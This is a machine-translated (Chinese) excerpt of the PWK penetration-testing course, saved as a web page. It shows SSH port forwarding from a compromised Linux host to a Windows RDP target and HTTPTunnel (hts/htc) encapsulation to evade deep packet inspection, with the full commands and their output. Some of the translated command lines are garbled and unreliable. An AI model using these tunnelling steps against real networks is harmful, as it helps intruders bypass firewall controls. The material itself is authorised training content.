
<!-- saved from url=(0051)https://translate.googleusercontent.com/translate_f -->
<html lang="zh-CN" class="translated-ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="google" content="notranslate">
<script>(function(){/*

 Copyright The Closure Library Authors.
 SPDX-License-Identifier: Apache-2.0
*/
(function(){function e(g){this.t={};this.tick=function(h,k,f){this.t[h]=[void 0!=f?f:(new Date).getTime(),k];if(void 0==f)try{window.console.timeStamp("CSI/"+h)}catch(m){}};this.getStartTickTime=function(){return this.t.start[0]};this.tick("start",null,g)}var a;if(window.performance)var d=(a=window.performance.timing)&&a.responseStart;var l=0<d?new e(d):new e;window.jstiming={Timer:e,load:l};if(a){var b=a.navigationStart;0<b&&d>=b&&(window.jstiming.srt=d-b)}if(a){var c=window.jstiming.load;0<b&&d>=
b&&(c.tick("_wtsrt",void 0,b),c.tick("wtsrt_","_wtsrt",d),c.tick("tbsd_","wtsrt_"))}try{a=null,window.chrome&&window.chrome.csi&&(a=Math.floor(window.chrome.csi().pageT),c&&0<b&&(c.tick("_tbnd",void 0,window.chrome.csi().startE),c.tick("tbnd_","_tbnd",b))),null==a&&window.gtbExternal&&(a=window.gtbExternal.pageT()),null==a&&window.external&&(a=window.external.pageT,c&&0<b&&(c.tick("_tbnd",void 0,window.external.startE),c.tick("tbnd_","_tbnd",b))),a&&(window.jstiming.pt=a)}catch(g){}})();}).call(window);
</script><script src="./o3cp[618-809]_files/translate_c.js.下载"></script><script>_intlStrings._originalText = "英语原文:";_intlStrings._interfaceDirection="ltr";_intlStrings._interfaceAlign="left";_intlStrings._langpair="en|zh-CN";_intlStrings._feedbackUrl="https://translate.google.com/translate_suggestion";_intlStrings._currentBy="当前的翻译是由%2$s在 %1$s完成的";_intlStrings._unknown="佚名译者";_intlStrings._suggestTranslation="更好的翻译建议"  ;_intlStrings._submit="贡献力量";_intlStrings._suggestThanks="感谢您为 Google 翻译提供翻译建议。";_intlStrings._reverse=false;_intlStrings._staticContentPath="https://www.gstatic.com/translate/infowindow/";</script><style type="text/css">.google-src-text {display: none !important} .google-src-active-text {display: block!important;color:black!important; font-size:12px!important;font-family:arial,sans-serif!important}.google-src-active-text a {font-size:12px!important}.google-src-active-text a:link {color:#00c!important;text-decoration:underline!important}.google-src-active-text a:visited {color:purple!important;text-decoration:underline!important}.google-src-active-text a:active {color:red!important;text-decoration:underline!important}</style><meta http-equiv="X-Translated-By" content="Google"><link href="https://translate.googleusercontent.com/o3cp[618-809].pdf" hreflang="en" rel="alternate machine-translated-from"><link href="./o3cp[618-809]_files/css" rel="stylesheet" type="text/css"><!--<base href="" target="_top">--><base href="." target="_top">

<title>在继续之前，花点时间了解这个公认的复杂交通流。 带封装的端口转发可以是co</title>
<style type="text/css" abt="234"></style><link type="text/css" rel="stylesheet" charset="UTF-8" href="./o3cp[618-809]_files/translateelement.css"><script type="text/javascript" charset="UTF-8" src="./o3cp[618-809]_files/main_zh-CN.js.下载"></script><script>//console.log('a')
</script><script>//remove baidu search ad
var _countAA = 0
function doBBBd(){}
doBBBd()
document.addEventListener('keyup', function(){_countAA-=10;doBBBd()}, false)
document.addEventListener('click', function(){_countAA-=10;doBBBd()}, false)

</script><script type="text/javascript" charset="UTF-8" src="./o3cp[618-809]_files/element_main.js.下载"></script><link rel="stylesheet" type="text/css" href="./o3cp[618-809]_files/iw_sprite.css"></head><body bgcolor="#ffffff" vlink="blue" link="blue">
        <style>
          .spinner-container {
            width:25%;
            top:20px;
            left:50%;
            margin-left:-12.5%;
            border-radius:8px;
            position:fixed;
            text-align:center;
            box-shadow:0 0 10px rgba(0,0,0,0.24);
            background:#fff;
            overflow:hidden;
          }

          .spinner-container p{
            font-family:'Roboto', Arial, sans-serif;
            color:rgba(0,0,0,0.87);
            margin:12px 0 16px 0;
            padding:0;
            font-size:12px;
          }

          .spinner-container img{
            width:22px;
            height:22px;
            margin:16px 0 0;
            padding:0;
          }
        </style>
        <div class="spinner-container notranslate" id="gt-dt-spinner" style="display: none;">
         <img src="./o3cp[618-809]_files/progress_spinner_color_20dp@2x.gif">
         <p>正在翻译...</p>
        </div>
      <iframe src="./o3cp[618-809]_files/translate_un.html" width="0" height="0" frameborder="0" style="width:0px;height:0px;border:0px;display:none;"></iframe>
<table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="1"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 1 页</font></font></b></a></font></td></tr></tbody></table><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:208;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:1285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:1285;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:1285;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">618</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:304;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在继续之前，花点时间了解这个公认的复杂交通流。</font><font style="vertical-align: inherit;">港口</font></font></nobr></div>
<div style="position:absolute;top:323;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">封装转发可能很复杂，因为我们必须考虑防火墙规则，</font></font></nobr></div>
<div style="position:absolute;top:342;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">协议限制，以及入站和出站端口分配。</font><font style="vertical-align: inherit;">它通常有助于暂停和</font></font></nobr></div>
<div style="position:absolute;top:362;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在执行实际操作之前，先写一张如下图 304 所示的地图或流程图</font></font></nobr></div>
<div style="position:absolute;top:381;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font><font style="vertical-align: inherit;">这个过程已经足够复杂了，无需试图弄清楚这两个逻辑流程</font></font></nobr></div>
<div style="position:absolute;top:401;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和语法同时进行。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:823;left:367"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 304：HTTP 封装</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:854;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了开始构建我们的隧道，我们将在我们的之间创建一个基于 SSH 的本地端口转发</font></font></nobr></div>
<div style="position:absolute;top:873;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">受损的 Linux 机器和 Windows 远程桌面目标。</font><font style="vertical-align: inherit;">记住，协议是</font></font></nobr></div>
<div style="position:absolute;top:893;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这里无关紧要（允许 SSH），因为此流量不受网络上的深度数据包检查的影响</font></font></nobr></div>
<div style="position:absolute;top:912;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内部网络。</font></font></nobr></div>
<div style="position:absolute;top:945;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为此，我们</font><font style="vertical-align: inherit;">将从这台机器 ( </font><b><font style="font-size:13px"><font style="vertical-align: inherit;">127.0.0.1</font></font></b><font style="vertical-align: inherit;"> )</font><font style="vertical-align: inherit;">创建一个本地转发 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-L</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font><font style="vertical-align: inherit;">并将登录为</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:965;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，使用我们在开发后创建的新密码。</font><font style="vertical-align: inherit;">我们将转发所有请求</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:984;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口 8888 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:8888</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 到 Windows Server 的远程桌面端口 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.110:3389</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:1018;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">www-data@debian:/$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1</font></font></font></b></nobr></div>
<div style="position:absolute;top:1036;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1</font></font></nobr></div>
<div style="position:absolute;top:1053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无法创建目录“/var/www/.ssh”。</font></font></nobr></div>
<div style="position:absolute;top:1070;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无法确定主机“127.0.0.1 (127.0.0.1)”的真实性。</font></font></nobr></div>
<div style="position:absolute;top:1087;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ECDSA 密钥指纹是 SHA256:RdJnCwlCxEG+c6nShI13N6oykXAbDJkRma3cLtknmJU。</font></font></nobr></div>
<div style="position:absolute;top:1103;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您确定要继续连接吗（是/否）？</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是的</font></font></font></b></nobr></div>
<div style="position:absolute;top:1120;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是的</font></font></nobr></div>
<div style="position:absolute;top:1138;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无法将主机添加到已知主机列表 (/var/www/.ssh/known_hosts)。</font></font></nobr></div>
<div style="position:absolute;top:1155;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@127.0.0.1 的密码：</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">lab</font></font></font></b></nobr></div>
<div style="position:absolute;top:1171;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:1205;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ss -antp | </font><font style="vertical-align: inherit;">grep "8888"</font></font></font></b></nobr></div>
</span></font>

<div style="position:absolute;top:1363;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="2"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第2页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:1396;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:2473;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:2473;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:2473;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">619</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:1492;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ss -antp | </font><font style="vertical-align: inherit;">grep "8888"</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:1508;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听 0 128    </font></font></b></nobr></div>
<div style="position:absolute;top:1508;left:360"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*:8888    </font></font></b></nobr></div>
<div style="position:absolute;top:1508;left:579"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*:*  </font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:1528;left:122"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 658 - 将我们受感染的 Linux 机器上的 TCP 端口 8888 转发到 Windows 服务器上的 TCP 端口 3389</font></font></i></nobr></div>
<div style="position:absolute;top:1544;left:422"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2016系统</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:1573;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们必须为 Kali Linux 机器创建一个 HTTPTunnel，以便让我们的流量通过</font></font></nobr></div>
<div style="position:absolute;top:1592;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仅限 HTTP 的协议限制。</font><font style="vertical-align: inherit;">如上所述，HTTPTunnel 使用客户端 ( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">htc</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 和</font></font></nobr></div>
<div style="position:absolute;top:1612;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器（</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hts</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）。</font></font></nobr></div>
<div style="position:absolute;top:1645;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将设置服务器（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hts</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">），它将侦听本地主机端口</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1234</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，从</font></font></nobr></div>
<div style="position:absolute;top:1664;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传入的 HTTP 流，并将其重定向到本地主机端口 8888（-- </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">forward-port</font></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:1684;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">localhost:8888 </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">)，由于前面的命令，它被重定向到 Windows 目标的</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:1703;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程桌面端口：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:1738;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hts --forward-port 本地主机:8888 1234</font></font></font></b></nobr></div>
<div style="position:absolute;top:1755;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hts --forward-port 本地主机：8888 1234</font></font></nobr></div>
<div style="position:absolute;top:1789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ps aux | </font><font style="vertical-align: inherit;">grep hts</font></font></font></b></nobr></div>
<div style="position:absolute;top:1805;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ps辅助| </font><font style="vertical-align: inherit;">grep hts</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:1822;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">学生 12080 0.0 0.0 2420 68 ?    </font></font></b></nobr></div>
<div style="position:absolute;top:1822;left:490"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ss 07:49 0:00 hts --forward-port lo</font></font></b></nobr></div>
<div style="position:absolute;top:1840;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">电话：8888 1234</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:1857;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">学生 12084 0.0 0.0 4728 836 pts/4 S+ 07:49 0:00 grep hts</font></font></nobr></div>
<div style="position:absolute;top:1890;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ss -antp | </font><font style="vertical-align: inherit;">grep "1234"</font></font></font></b></nobr></div>
<div style="position:absolute;top:1907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ss -antp | </font><font style="vertical-align: inherit;">grep "1234"</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:1924;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听 0 1 *:1234 *:* 用户:(("hts",pid=12080,fd=4))</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:1944;left:283"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 659 - 设置 HTTPTunnel 的服务器组件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:1973;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SS</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令表明HTTPTunnel服务器启动并运行。</font></font></nobr></div>
<div style="position:absolute;top:2006;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们需要一个 HTTPTunnel 客户端来获取我们的远程桌面流量，并将其封装到一个</font></font></nobr></div>
<div style="position:absolute;top:2025;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP 流，并将其发送到侦听 HTTPTunnel 服务器。</font><font style="vertical-align: inherit;">此 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">htc</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 命令将侦听</font></font></nobr></div>
<div style="position:absolute;top:2045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本地主机端口 8080 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--forward-port 8080</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )，HTTP 封装流量，并将其转发</font></font></nobr></div>
<div style="position:absolute;top:2064;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口 1234 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.128:1234</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font><font style="vertical-align: inherit;">上我们侦听 HTTPTunnel 服务器的防火墙</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:2099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">htc --forward-port 8080 10.11.0.128:1234</font></font></font></b></nobr></div>
<div style="position:absolute;top:2133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ps aux | </font><font style="vertical-align: inherit;">宏达</font></font></font></b></nobr></div>
<div style="position:absolute;top:2150;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卡利 10051 0.0 0.0 6536 92 ?    </font></font></nobr></div>
<div style="position:absolute;top:2150;left:498"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ss 03:33 0:00 htc --forward-port 8</font></font></nobr></div>
<div style="position:absolute;top:2167;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">080 10.11.0.128:1234</font></font></nobr></div>
<div style="position:absolute;top:2184;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卡利 10053 0.0 0.0 12980 1056 pts/0 S+ 03:33 0:00 grep htc</font></font></nobr></div>
<div style="position:absolute;top:2218;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ss -antp | </font><font style="vertical-align: inherit;">grep "8080"</font></font></font></b></nobr></div>
<div style="position:absolute;top:2235;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听 0 0 0.0.0.0:8080 0.0.0.0:* 用户:(("htc",pid=2692,fd=4))</font></font></nobr></div>
<div style="position:absolute;top:2254;left:285"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 660 - 设置 HTTPTunnel 的客户端组件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:2284;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">同样，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ps</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ss</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令显示 HTTPTunnel 客户端已启动并正在运行。</font></font></nobr></div>
<div style="position:absolute;top:2317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在，所有发送到 Kali Linux 机器上 TCP 端口 8080 的流量都将被重定向到我们的</font></font></nobr></div>
<div style="position:absolute;top:2336;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTPTunnel（它是 HTTP 封装的，通过防火墙发送到受感染的 Linux</font></font></nobr></div>
<div style="position:absolute;top:2355;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器并解封）并再次重定向到 Windows Server 的远程桌面服务。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:2551;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="3"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 3 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:2584;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:3661;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:3661;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:3661;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">620</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:2680;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以通过启动 Wireshark 来嗅探流量来验证这是否有效，并验证它正在</font></font></nobr></div>
<div style="position:absolute;top:2699;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP 封装，在针对我们的 Kali Linux 机器发起远程桌面连接之前</font></font></nobr></div>
<div style="position:absolute;top:2718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">监听端口 8080：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:3141;left:214"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 305：通过 HTTP 隧道在 Windows Server 2016 机器上登录 RDP</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:3172;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">优秀的！</font><font style="vertical-align: inherit;">远程桌面连接成功。</font></font></nobr></div>
<div style="position:absolute;top:3205;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查 Wireshark 中的流量，我们确认它确实是 HTTP 封装的，并且会</font></font></nobr></div>
<div style="position:absolute;top:3224;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绕过了深度包内容检测设备。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:3739;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="4"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 4 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:3772;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:4849;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:4849;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:4849;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">621</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:4257;left:266"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 306：在 Wireshark 中检查 HTTTP 封装的流量</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:4289;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.5.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:4319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.</font><font style="vertical-align: inherit;">使用 rdesktop</font><font style="vertical-align: inherit;">作为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">学生</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户</font><font style="vertical-align: inherit;">连接到您的专用 Linux 实验室客户端</font><font style="vertical-align: inherit;">并运行</font></font></nobr></div>
<div style="position:absolute;top:4338;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自 /root/port_forwarding_and_tunneling/ 的 http_tunneling.sh 脚本作为 root。</font></font></nobr></div>
<div style="position:absolute;top:4366;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 启动</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apache2</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务，利用443端口托管的易受攻击的Web应用程序</font></font></nobr></div>
